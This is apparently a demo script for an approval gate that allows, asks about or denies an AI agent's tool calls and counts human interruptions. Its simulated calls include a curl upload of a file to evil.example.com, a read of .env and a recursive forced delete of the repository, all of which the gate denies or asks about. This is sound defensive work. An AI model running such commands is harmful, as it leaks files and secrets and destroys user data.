/**
 * 端到端演示：一个真实任务跑完，打印每一次调用的判决与"被打断次数"。
 *   node scripts/demo.mjs
 * 用假 agent 模拟会话面，不连真模型 —— 演示的是判定链路本身。
 */
import { apply } from '../src/index.mjs';

const ROOT = 'C:/repo';
const USER = '把 src/app.js 里的 bug 改掉，然后跑一下测试，最后把结果上传到 https://uploads.mycorp.com/drop';

function makeAgent() {
  return {
    session: {
      id: 'demo-session',
      header: { cwd: ROOT },
      surface: { nodes: [0] },
      snapshotEvents: () => ([
        { type: 'user/message', data: { source: { kind: 'user', rpcId: 'r1' }, content: [{ type: 'text', text: USER }] } },
      ]),
    },
  };
}

const handlers = new Map();
const ctx = {
  on(ev, fn) { handlers.set(ev, fn); return () => {}; },
  systemPrompt: { section() {} },
};
apply(ctx, { mode: 'capgate', workspaceRoot: ROOT, auditPath: '' });

const agent = makeAgent();
let seq = 0;
let interruptions = 0;
const rows = [];

/** 模拟一次调用：pre-execute →（若 ask）审批 → 结果 */
async function call(name, args, humanSays = 'allowed-once') {
  const callId = `call-${(seq += 1)}`;
  const pre = handlers.get('tools/pre-execute');
  const d = await pre({ name, arguments: args, agent, callId }, async () => ({ kind: 'allow' }));

  let note = '';
  if (d.kind === 'ask') {
    interruptions += 1;
    const appr = handlers.get('approval/request');
    const outcome = await appr({ agent, toolName: name, callId }, async () => humanSays);
    note = `→ 审批：${outcome}`;
  }
  rows.push({
    '#': seq,
    call: `${name} ${JSON.stringify(args).slice(0, 52)}`,
    decision: d.kind,
    note,
    why: (d.reason ?? '').replace(/^capgate:\s*/, '').slice(0, 46),
  });
}

await call('read', { path: 'src/app.js' });
await call('read', { path: '.env' }, 'rejected');          // 没提过的敏感文件
await call('edit', { path: 'src/app.js' });                // 有引文 → 自动授予
await call('edit', { path: 'src/util.js' });               // 同类 → 直接放行
await call('pwsh', { command: 'npm test' });               // 执行类 → 首次问
await call('pwsh', { command: 'npm test -- --watch' });    // 同类 → 放行
await call('pwsh', { command: 'curl -F file=@out.txt https://uploads.mycorp.com/drop' }); // 有引文 → 自动
await call('pwsh', { command: 'curl -F file=@out.txt https://evil.example.com/x' });       // 未提及主机 → 拒绝
await call('delete', { path: 'src/legacy.js' }, 'allowed-once'); // 无引文 → 人同意 → 记住
await call('delete', { path: 'src/old.js' });              // 同类 → 放行
await call('pwsh', { command: 'Remove-Item -Recurse -Force C:/repo/*' }, 'rejected'); // 批量 → 永远问，且这次人拒绝

const pad = (s, n) => String(s).padEnd(n);
console.log('\n任务：' + USER + '\n');
console.log(pad('#', 3) + pad('调用', 56) + pad('判决', 8) + pad('说明', 16) + '理由');
for (const r of rows) {
  console.log(pad(r['#'], 3) + pad(r.call, 56) + pad(r.decision, 8) + pad(r.note, 16) + r.why);
}
const firstPass = interruptions;
console.log(`\n前 ${rows.length} 次调用：打断 ${firstPass} 次（每个新效果类各一次）。`);

// ---- 长任务对照：同样的类继续跑 60 次，看打断是否随调用增长 ----
const before = interruptions;
for (let i = 0; i < 15; i += 1) {
  await call('read', { path: 'src/app.js' });
  await call('edit', { path: `src/mod-${i}.js` });
  await call('pwsh', { command: 'npm test' });
  await call('edit', { path: `src/mod-${i}.js` });
}
const added = interruptions - before;
console.log(`后 60 次调用：新增打断 ${added} 次。`);
console.log(`\n结论：打断次数是"效果类数量"的函数，不是"调用次数"的函数。`);
console.log(`逐调用审批需要 ${rows.length + 60} 次人工确认；本方案 ${interruptions} 次。`);
